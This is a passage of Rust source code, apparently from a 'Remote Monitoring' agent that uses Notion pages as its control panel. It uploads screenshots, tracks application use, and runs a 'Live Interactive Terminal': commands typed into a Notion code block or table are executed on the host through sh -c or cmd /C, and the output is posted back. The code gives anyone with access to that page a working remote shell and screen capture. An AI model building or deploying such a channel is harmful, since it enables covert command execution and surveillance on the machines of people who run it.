            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&create_body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to create file upload {}: {}", status, error_text));
        }

        let create_result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        let file_upload_id = create_result["id"].as_str()
            .ok_or("No file upload ID returned")?
            .to_string();

        log::info!("Created file upload with ID: {}", file_upload_id);

        // Step 2: Upload file content using multipart/form-data
        let send_url = format!("{}/file_uploads/{}/send", NOTION_API_BASE, file_upload_id);

        let part = reqwest::multipart::Part::bytes(file_bytes.to_vec())
            .file_name(filename.to_string())
            .mime_str("image/png")
            .map_err(|e| e.to_string())?;

        let form = reqwest::multipart::Form::new().part("file", part);

        let upload_response = self.client
            .post(&send_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .multipart(form)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !upload_response.status().is_success() {
            let status = upload_response.status();
            let error_text = upload_response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to upload file content {}: {}", status, error_text));
        }

        log::info!("Successfully uploaded file content");

        Ok(file_upload_id)
    }

    /// Append screenshot to debugging section in page
    pub async fn append_screenshot_to_page(&self, page_id: &str, file_upload_id: &str) -> Result<(), String> {
        let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);

        // Get existing blocks to check if debugging section exists
        let response = self.client
            .get(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        let blocks_data: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;

        // Check if debugging section exists
        let mut has_debugging_section = false;
        if let Some(results) = blocks_data["results"].as_array() {
            for block in results {
                if let Some(block_type) = block.get("type") {
                    if block_type == "heading_2" {
                        if let Some(heading) = block.get("heading_2") {
                            if let Some(rich_text) = heading.get("rich_text") {
                                if let Some(text_array) = rich_text.as_array() {
                                    if !text_array.is_empty() {
                                        if let Some(text) = text_array[0].get("text") {
                                            if let Some(content) = text.get("content") {
                                                if content.as_str() == Some("⌛ Screenshot History") {
                                                    has_debugging_section = true;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        // Create debugging section if it doesn't exist
        let mut children = vec![];
        if !has_debugging_section {
            children.push(json!({
                "object": "block",
                "type": "heading_3",
                "heading_3": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "⌛ Screenshot History"}
                    }]
                }
            }));
        }

        // Add timestamp and screenshot
        let now = chrono::Local::now();
        children.push(json!({
            "object": "block",
            "type": "paragraph",
            "paragraph": {
                "rich_text": [{
                    "type": "text",
                    "text": {"content": format!("Screenshot captured at: {}", now.format("%Y-%m-%d %H:%M:%S"))}
                }]
            }
        }));

        children.push(json!({
            "object": "block",
            "type": "image",
            "image": {
                "type": "file_upload",
                "file_upload": {
                    "id": file_upload_id
                }
            }
        }));

        // Append blocks
        let body = json!({"children": children});

        let response = self.client
            .patch(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to append screenshot {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Update page icon to computer emoji
    pub async fn update_page_icon(&self, page_id: &str) -> Result<(), String> {
        let url = format!("{}/pages/{}", NOTION_API_BASE, page_id);

        let body = json!({
            "icon": {
                "type": "emoji",
                "emoji": "💻"
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update page icon {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Get all blocks from a page to find debugging command table
    pub async fn get_page_blocks(&self, page_id: &str) -> Result<serde_json::Value, String> {
        let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);

        let response = self.client
            .get(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to get page blocks {}: {}", status, error_text));
        }

        let blocks_data: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        Ok(blocks_data)
    }

    /// Delete a block by ID
    pub async fn delete_block(&self, block_id: &str) -> Result<(), String> {
        let url = format!("{}/blocks/{}", NOTION_API_BASE, block_id);

        let response = self.client
            .delete(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to delete block {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Delete all blocks from a page (used for full recreation)
    pub async fn delete_all_page_blocks(&self, page_id: &str) -> Result<(), String> {
        log::warn!("Deleting all blocks from page for full recreation");

        let blocks_data = self.get_page_blocks(page_id).await?;
        if let Some(results) = blocks_data["results"].as_array() {
            log::info!("Found {} blocks to delete", results.len());

            for block in results {
                if let Some(block_id) = block.get("id").and_then(|id| id.as_str()) {
                    log::debug!("Deleting block: {}", block_id);
                    let _ = self.delete_block(block_id).await; // Ignore errors
                }
            }

            // Wait for deletions to complete
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
        }

        Ok(())
    }

    /// Validate and fix page structure
    /// Returns the database ID if page structure was recreated
    pub async fn validate_and_fix_page_structure(&self, page_id: &str, hostname: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        let results = blocks_data["results"].as_array()
            .ok_or("No blocks found")?;

        let mut has_main_heading = false;
        let mut has_app_stats_heading = false;
        let mut has_terminal_heading = false;
        let mut has_terminal_code_block = false;
        let mut has_screenshot_heading = false;
        let mut blocks_to_delete = Vec::new();

        log::info!("Validating page structure, found {} blocks", results.len());

        for (index, block) in results.iter().enumerate() {
            let block_type = block.get("type").and_then(|t| t.as_str()).unwrap_or("");
            let block_id = block.get("id").and_then(|id| id.as_str()).unwrap_or("");

            log::debug!("Block {}: type={}", index, block_type);

            match block_type {
                "heading_1" => {
                    let content = self.get_heading_content(block, "heading_1");
                    if content.contains("Remote Monitoring") {
                        has_main_heading = true;
                        log::debug!("Found main heading");
                    }
                }
                "heading_2" => {
                    let content = self.get_heading_content(block, "heading_2");
                    if content.contains("Application Usage Statistics") {
                        has_app_stats_heading = true;
                        log::debug!("Found app stats heading");
                    } else if content.contains("Live Interactive Terminal") {
                        has_terminal_heading = true;
                        log::debug!("Found terminal heading");
                    } else if content.contains("Screenshot Trail") {
                        has_screenshot_heading = true;
                        log::debug!("Found screenshot heading");
                    } else if content.contains("Debugging") {
                        // Old debugging section, mark for deletion
                        log::info!("Found old debugging section heading, marking for deletion");
                        blocks_to_delete.push(block_id.to_string());
                    }
                }
                "table" => {
                    // Check if this is the usage statistics table (keep it) or debugging table (delete it)
                    // We identify it by checking if it's near the app stats heading
                    let is_near_stats = if index > 0 {
                        let mut found = false;
                        for i in (index.saturating_sub(3))..index {
                            if let Some(prev_block) = results.get(i) {
                                let prev_type = prev_block.get("type").and_then(|t| t.as_str()).unwrap_or("");
                                if prev_type == "heading_2" {
                                    let content = self.get_heading_content(prev_block, "heading_2");
                                    if content.contains("Application Usage Statistics") {
                                        found = true;
                                        break;
                                    }
                                }
                            }
                        }
                        found
                    } else {
                        false
                    };

                    if !is_near_stats {
                        log::info!("Found non-stats table block, marking for deletion: {}", block_id);
                        blocks_to_delete.push(block_id.to_string());
                    } else {
                        log::debug!("Found usage statistics table, keeping it");
                    }
                }
                "code" => {
                    if let Some(code) = block.get("code") {
                        if let Some(rich_text) = code.get("rich_text").and_then(|rt| rt.as_array()) {
                            if !rich_text.is_empty() {
                                if let Some(first) = rich_text.first() {
                                    let content = first.get("text")
                                        .and_then(|t| t.get("content"))
                                        .and_then(|c| c.as_str())
                                        .unwrap_or("");

                                    if content.contains(">") {
                                        has_terminal_code_block = true;
                                        log::debug!("Found terminal code block");
                                    }
                                }
                            }
                        }
                    }
                }
                _ => {}
            }
        }

        // Delete incorrect blocks
        for block_id in blocks_to_delete {
            log::info!("Deleting block: {}", block_id);
            self.delete_block(&block_id).await?;
        }

        // Add missing sections
        let sections_to_add: Vec<serde_json::Value> = Vec::new();

        // If any critical section is missing, recreate entire structure to maintain order
        if !has_main_heading || !has_app_stats_heading || !has_terminal_heading || !has_terminal_code_block || !has_screenshot_heading {
            log::warn!("Missing sections detected - recreating entire page structure to maintain order");
            log::info!("Missing: main_heading={}, app_stats={}, terminal_heading={}, terminal_block={}, screenshot={}",
                      !has_main_heading, !has_app_stats_heading, !has_terminal_heading, !has_terminal_code_block, !has_screenshot_heading);

            // Delete all existing blocks first
            for block in results {
                let block_id = block.get("id").and_then(|id| id.as_str()).unwrap_or("");
                if !block_id.is_empty() {
                    log::debug!("Deleting existing block: {}", block_id);
                    let _ = self.delete_block(block_id).await; // Ignore errors
                }
            }

            // Recreate entire structure
            let db_id = self.initialize_page_structure(page_id, hostname).await?;
            return Ok(db_id);
        }

        log::info!("All sections present, no validation changes needed");
        return Ok(None);

        // Old logic below - no longer used since we recreate everything if anything is missing
        #[allow(unreachable_code)]
        if !has_app_stats_heading {
            log::info!("App stats heading missing, adding with description");
            sections_to_add.push(json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "📊 Application Usage Statistics"}
                    }]
                }
            }));
            sections_to_add.push(json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Track which applications are being used and for how long."}
                    }],
                    "color": "gray"
                }
            }));
            sections_to_add.push(json!({
                "object": "block",
                "type": "callout",
                "callout": {
                    "rich_text": [
                        {
                            "type": "text",
                            "text": {
                                "content": "Tip: To show this database inline, hover over it, click the "
                            }
                        },
                        {
                            "type": "text",
                            "text": { "content": "⋮⋮" },
                            "annotations": { "code": true }
                        },
                        {
                            "type": "text",
                            "text": { "content": " handle, and select " }
                        },
                        {
                            "type": "text",
                            "text": { "content": "Turn into inline database" },
                            "annotations": { "code": true }
                        },
                        {
                            "type": "text",
                            "text": { "content": "." }
                        }
                    ],
                    "icon": { "emoji": "💡" },
                    "color": "gray_background"
                }
            }));

        }

        if !has_terminal_heading {
            log::info!("Terminal heading missing, adding");
            sections_to_add.push(json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "💻 Live Interactive Terminal"}
                    }]
                }
            }));
            sections_to_add.push(json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Type commands after the prompt. Outputs will appear automatically."}
                    }]
                }
            }));
        }

        if !has_terminal_code_block {
            log::info!("Terminal code block missing, adding");
            let home_dir = std::env::var("HOME")
                .or_else(|_| std::env::var("USERPROFILE"))
                .unwrap_or_else(|_| "~".to_string());

            sections_to_add.push(json!({
                "object": "block",
                "type": "code",
                "code": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": format!("{}> ", home_dir)}
                    }],
                    "language": "bash"
                }
            }));
        }

        if !has_screenshot_heading {
            log::info!("Screenshot heading missing, adding");
            sections_to_add.push(json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "📸 Screenshot Trail"}
                    }]
                }
            }));
            sections_to_add.push(json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Set Screenshot property to 'True' to capture the current screen. Screenshots will be added below with timestamps."}
                    }]
                }
            }));
        }

        // Add missing sections
        if !sections_to_add.is_empty() {
            let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);
            let body = json!({"children": sections_to_add});

            let response = self.client
                .patch(&blocks_url)
                .header("Authorization", format!("Bearer {}", self.token))
                .header("Notion-Version", NOTION_VERSION)
                .header("Content-Type", "application/json")
                .json(&body)
                .send()
                .await
                .map_err(|e| e.to_string())?;

            if !response.status().is_success() {
                let status = response.status();
                let error_text = response.text().await.map_err(|e| e.to_string())?;
                return Err(format!("Failed to add missing sections {}: {}", status, error_text));
            }

            log::info!("Added {} missing sections", sections_to_add.len());
        }

        Ok(None)
    }

    /// Helper to extract heading content
    fn get_heading_content(&self, block: &serde_json::Value, heading_type: &str) -> String {
        block.get(heading_type)
            .and_then(|h| h.get("rich_text"))
            .and_then(|rt| rt.as_array())
            .and_then(|arr| arr.first())
            .and_then(|item| item.get("text"))
            .and_then(|t| t.get("content"))
            .and_then(|c| c.as_str())
            .unwrap_or("")
            .to_string()
    }

    /// Find the debugging command table in the page blocks
    #[allow(dead_code)]
    pub async fn find_debugging_table_id(&self, page_id: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        if let Some(results) = blocks_data["results"].as_array() {
            for block in results {
                // Check if this is a table block
                if block.get("type") == Some(&json!("table")) {
                    // Get the table's children to check if it's the debugging table
                    if let Some(table_id) = block.get("id").and_then(|id| id.as_str()) {
                        // Fetch table rows to verify it's the debugging table
                        if let Ok(table_rows) = self.get_table_rows(table_id).await {
                            if let Some(rows) = table_rows["results"].as_array() {
                                if !rows.is_empty() {
                                    // Check first row for header
                                    if let Some(first_row) = rows.first() {
                                        if let Some(cells) = first_row["table_row"]["cells"].as_array() {
                                            if cells.len() == 2 {
                                                // Check if headers are "Command" and "Output"
                                                let first_cell = cells[0].as_array()
                                                    .and_then(|arr| arr.first())
                                                    .and_then(|cell| cell["text"]["content"].as_str())
                                                    .unwrap_or("");

                                                if first_cell.contains("Command") {
                                                    return Ok(Some(table_id.to_string()));
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Get all rows from a table block
    #[allow(dead_code)]
    pub async fn get_table_rows(&self, table_id: &str) -> Result<serde_json::Value, String> {
        let url = format!("{}/blocks/{}/children", NOTION_API_BASE, table_id);

        let response = self.client
            .get(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to get table rows {}: {}", status, error_text));
        }

        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;
        Ok(result)
    }

    /// Read debugging commands from the table and return Vec<(row_id, command, command_cell)> for rows without output
    #[allow(dead_code)]
    pub async fn get_pending_commands(&self, table_id: &str) -> Result<Vec<(String, String, serde_json::Value)>, String> {
        let table_rows = self.get_table_rows(table_id).await?;
        let mut pending_commands = Vec::new();

        if let Some(rows) = table_rows["results"].as_array() {
            for (index, row) in rows.iter().enumerate() {
                // Skip header row (index 0)
                if index == 0 {
                    continue;
                }

                if let Some(row_id) = row["id"].as_str() {
                    if let Some(cells) = row["table_row"]["cells"].as_array() {
                        if cells.len() >= 2 {
                            // Get command from first cell
                            let command = cells[0].as_array()
                                .and_then(|arr| arr.first())
                                .and_then(|cell| cell["text"]["content"].as_str())
                                .unwrap_or("");

                            // Get output from second cell
                            let output = cells[1].as_array()
                                .and_then(|arr| arr.first())
                                .and_then(|cell| cell["text"]["content"].as_str())
                                .unwrap_or("");

                            // If command exists but output is empty, add to pending
                            if !command.is_empty() && output.is_empty() {
                                pending_commands.push((
                                    row_id.to_string(),
                                    command.to_string(),
                                    cells[0].clone() // Preserve the original command cell
                                ));
                            }
                        }
                    }
                }
            }
        }

        Ok(pending_commands)
    }

    /// Update a table row with command output
    #[allow(dead_code)]
    pub async fn update_table_row_output(&self, row_id: &str, command_cell: &serde_json::Value, output: &str) -> Result<(), String> {
        let url = format!("{}/blocks/{}", NOTION_API_BASE, row_id);

        // Truncate output if too long (Notion has limits)
        let truncated_output = if output.len() > 2000 {
            format!("{}... [truncated]", &output[..1997])
        } else {
            output.to_string()
        };

        let body = json!({
            "table_row": {
                "cells": [
                    command_cell, // Preserve the original command cell
                    [{"type": "text", "text": {"content": truncated_output}}]
                ]
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update table row {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Create the debugging command table if it doesn't exist
    #[allow(dead_code)]
    pub async fn create_debugging_table(&self, page_id: &str) -> Result<String, String> {
        let blocks_url = format!("{}/blocks/{}/children", NOTION_API_BASE, page_id);

        let children = vec![
            json!({
                "object": "block",
                "type": "heading_2",
                "heading_2": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "🛠️ Debugging Support Staff"}
                    }]
                }
            }),
            json!({
                "object": "block",
                "type": "paragraph",
                "paragraph": {
                    "rich_text": [{
                        "type": "text",
                        "text": {"content": "Type commands in the Command column to execute them remotely. Output will appear automatically."}
                    }]
                }
            }),
            json!({
                "object": "block",
                "type": "table",
                "table": {
                    "table_width": 2,
                    "has_column_header": true,
                    "has_row_header": false,
                    "children": [
                        json!({
                            "object": "block",
                            "type": "table_row",
                            "table_row": {
                                "cells": [
                                    [{"type": "text", "text": {"content": "Command"}, "annotations": {"bold": true}}],
                                    [{"type": "text", "text": {"content": "Output"}, "annotations": {"bold": true}}]
                                ]
                            }
                        })
                    ]
                }
            })
        ];

        let body = json!({"children": children});

        let response = self.client
            .patch(&blocks_url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to create debugging table {}: {}", status, error_text));
        }

        // Find the table ID from the created blocks
        let result: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;

        if let Some(results) = result["results"].as_array() {
            for block in results {
                if block["type"] == "table" {
                    if let Some(table_id) = block["id"].as_str() {
                        return Ok(table_id.to_string());
                    }
                }
            }
        }

        Err("Failed to find created table ID".to_string())
    }

    /// Ensure debugging table exists and return its ID
    #[allow(dead_code)]
    pub async fn ensure_debugging_table(&self, page_id: &str) -> Result<String, String> {
        // Try to find existing table
        if let Some(table_id) = self.find_debugging_table_id(page_id).await? {
            return Ok(table_id);
        }

        // Create new table if it doesn't exist
        self.create_debugging_table(page_id).await
    }

    /// Execute a system command and return its output
    #[allow(dead_code)]
    pub fn execute_command(command: &str) -> String {
        log::info!("Executing command: {}", command);

        // Determine the shell based on OS
        let (shell, shell_arg) = if cfg!(target_os = "windows") {
            ("cmd", "/C")
        } else {
            ("sh", "-c")
        };

        // Execute the command
        match ProcessCommand::new(shell)
            .arg(shell_arg)
            .arg(command)
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                let result = if output.status.success() {
                    if stdout.is_empty() && stderr.is_empty() {
                        "Command executed successfully (no output)".to_string()
                    } else if !stdout.is_empty() {
                        stdout.to_string()
                    } else {
                        stderr.to_string()
                    }
                } else {
                    format!("Error (exit code {:?}):\n{}{}",
                        output.status.code(),
                        stdout,
                        stderr
                    )
                };

                log::info!("Command output: {} bytes", result.len());
                result
            }
            Err(e) => {
                let error_msg = format!("Failed to execute command: {}", e);
                log::error!("{}", error_msg);
                error_msg
            }
        }
    }

    /// Process all pending debugging commands for a page
    #[allow(dead_code)]
    pub async fn process_debugging_commands(&self, page_id: &str) -> Result<usize, String> {
        // Ensure the debugging table exists
        let table_id = match self.ensure_debugging_table(page_id).await {
            Ok(id) => id,
            Err(e) => {
                log::debug!("Could not ensure debugging table: {}", e);
                return Ok(0);
            }
        };

        // Get pending commands
        let pending = self.get_pending_commands(&table_id).await?;

        if pending.is_empty() {
            return Ok(0);
        }

        log::info!("Found {} pending debugging commands", pending.len());

        // Execute each command and update the output
        for (row_id, command, command_cell) in pending.iter() {
            log::info!("Processing command in row {}: {}", row_id, command);

            // Execute the command
            let output = Self::execute_command(command);

            // Update the row with output
            match self.update_table_row_output(row_id, command_cell, &output).await {
                Ok(_) => {
                    log::info!("Successfully updated row {} with output", row_id);
                }
                Err(e) => {
                    log::error!("Failed to update row {} with output: {}", row_id, e);
                }
            }
        }

        Ok(pending.len())
    }

    /// Find the terminal code block in the page (looks for code block containing ">")
    pub async fn find_terminal_block(&self, page_id: &str) -> Result<Option<String>, String> {
        let blocks_data = self.get_page_blocks(page_id).await?;

        if let Some(results) = blocks_data["results"].as_array() {
            for block in results {
                if block.get("type") == Some(&json!("code")) {
                    if let Some(code) = block.get("code") {
                        if let Some(rich_text) = code.get("rich_text").and_then(|rt| rt.as_array()) {
                            if !rich_text.is_empty() {
                                if let Some(first) = rich_text.first() {
                                    let content = first.get("text")
                                        .and_then(|t| t.get("content"))
                                        .and_then(|c| c.as_str())
                                        .unwrap_or("");

                                    if content.contains(">") {
                                        return Ok(block.get("id").and_then(|id| id.as_str()).map(String::from));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(None)
    }

    /// Get content from a code block
    pub async fn get_code_block_content(&self, block_id: &str) -> Result<String, String> {
        let url = format!("{}/blocks/{}", NOTION_API_BASE, block_id);

        let response = self.client
            .get(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            return Err("Failed to get code block".to_string());
        }

        let block: serde_json::Value = response.json().await.map_err(|e| e.to_string())?;

        if let Some(code) = block.get("code") {
            if let Some(rich_text) = code.get("rich_text").and_then(|rt| rt.as_array()) {
                let content: String = rich_text
                    .iter()
                    .filter_map(|item| {
                        item.get("text")
                            .and_then(|t| t.get("content"))
                            .and_then(|c| c.as_str())
                    })
                    .collect();
                return Ok(content);
            }
        }

        Ok(String::new())
    }

    /// Update code block content (with 2000 char limit and truncation)
    pub async fn update_code_block(&self, block_id: &str, content: &str) -> Result<(), String> {
        let url = format!("{}/blocks/{}", NOTION_API_BASE, block_id);

        // Notion has a 2000 character limit for code blocks
        // Keep only the last portion if it exceeds the limit
        let truncated_content = if content.len() > 1900 {
            // Keep last 1800 chars to leave room for truncation message
            let start_pos = content.len() - 1800;
            // Try to find a newline to start from
            let better_start = content[start_pos..].find('\n')
                .map(|pos| start_pos + pos + 1)
                .unwrap_or(start_pos);

            format!("...[truncated]\n{}", &content[better_start..])
        } else {
            content.to_string()
        };

        log::debug!("Updating code block: {} chars (original: {})", truncated_content.len(), content.len());

        let body = json!({
            "code": {
                "rich_text": [{
                    "type": "text",
                    "text": {"content": truncated_content}
                }],
                "language": "bash"
            }
        });

        let response = self.client
            .patch(&url)
            .header("Authorization", format!("Bearer {}", self.token))
            .header("Notion-Version", NOTION_VERSION)
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .map_err(|e| e.to_string())?;

        if !response.status().is_success() {
            let status = response.status();
            let error_text = response.text().await.map_err(|e| e.to_string())?;
            return Err(format!("Failed to update code block {}: {}", status, error_text));
        }

        Ok(())
    }

    /// Execute command in specific directory and return (output, new_cwd)
    pub fn execute_command_in_directory(command: &str, cwd: &str) -> (String, String) {
        use std::path::Path;

        log::info!("Executing in {}: {}", cwd, command);

        let trimmed = command.trim();

        // Handle cd command specially to update working directory
        if trimmed.starts_with("cd ") {
            let path_str = trimmed.strip_prefix("cd ").unwrap_or("").trim();
            let target_path = if path_str.is_empty() || path_str == "~" {
                std::env::var("HOME")
                    .or_else(|_| std::env::var("USERPROFILE"))
                    .unwrap_or_else(|_| ".".to_string())
            } else {
                path_str.to_string()
            };

            let new_path = if Path::new(&target_path).is_absolute() {
                target_path.clone()
            } else {
                Path::new(cwd).join(&target_path).to_string_lossy().to_string()
            };

            // Try to canonicalize the path to resolve .. and . properly
            let resolved_path = match Path::new(&new_path).canonicalize() {
                Ok(canonical) => canonical.to_string_lossy().to_string(),
                Err(_) => {
                    // If canonicalize fails, try manual resolution
                    let mut components = Vec::new();
                    for component in Path::new(&new_path).components() {
                        match component {
                            std::path::Component::ParentDir => {
                                components.pop();
                            }
                            std::path::Component::CurDir => {}
                            _ => components.push(component.as_os_str().to_string_lossy().to_string()),
                        }
                    }
                    components.join(if cfg!(target_os = "windows") { "\\" } else { "/" })
                }
            };

            // Verify the path exists
            if Path::new(&resolved_path).exists() {
                return ("".to_string(), resolved_path);
            } else {
                return (format!("cd: {}: No such file or directory", path_str), cwd.to_string());
            }
        }

        // Execute regular command in the specified directory
        let (shell, shell_arg) = if cfg!(target_os = "windows") {
            ("cmd", "/C")
        } else {
            ("sh", "-c")
        };

        match ProcessCommand::new(shell)
            .arg(shell_arg)
            .arg(trimmed)
            .current_dir(cwd)
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                let result = if output.status.success() {
                    if stdout.is_empty() && stderr.is_empty() {
                        "".to_string()
                    } else if !stdout.is_empty() {
                        stdout.to_string()
                    } else {
                        stderr.to_string()
                    }
                } else {
                    format!("{}{}",
                        stdout,
                        stderr
                    )
                };

                (result, cwd.to_string())
            }
            Err(e) => {
                (format!("Error: {}", e), cwd.to_string())
            }
        }
    }

    /// Update the terminal - check for new commands and execute them
    pub async fn update_terminal(&self, page_id: &str, current_cwd: &str) -> Result<String, String> {
        // Find terminal block
        let block_id = match self.find_terminal_block(page_id).await? {
            Some(id) => id,
            None => {
                log::debug!("Terminal block not found");
                return Ok(current_cwd.to_string());
            }
        };

        // Get current content
        let content = self.get_code_block_content(&block_id).await?;

        // Split into lines
        let lines: Vec<&str> = content.lines().collect();
        if lines.is_empty() {
            return Ok(current_cwd.to_string());
        }

        // Check if the last line is a prompt waiting for input or has a command
        let last_line = lines[lines.len() - 1];

        // Parse command from last line (format: "path> command")
        // Look for "> " followed by non-whitespace (the command)
        if let Some(prompt_end) = last_line.find("> ") {
            let after_prompt = &last_line[prompt_end + 2..];
            let command = after_prompt.trim();

            // If no command after prompt, nothing to execute
            if command.is_empty() {
                return Ok(current_cwd.to_string());
            }

            log::info!("Found terminal command: {}", command);

            // Execute command
            let (output, new_cwd) = Self::execute_command_in_directory(command, current_cwd);

            // Build new terminal content
            let mut new_content = content.clone();

            // Always add a newline after the command, then add output if present
            new_content.push('\n');
            if !output.is_empty() {
                new_content.push_str(&output);
                if !output.ends_with('\n') {
                    new_content.push('\n');
                }
            }

            // Add new prompt with updated directory
            new_content.push_str(&format!("{}> ", new_cwd));

            // Update the paragraph block
            self.update_code_block(&block_id, &new_content).await?;

            return Ok(new_cwd);
        }

        Ok(current_cwd.to_string())
    }
}
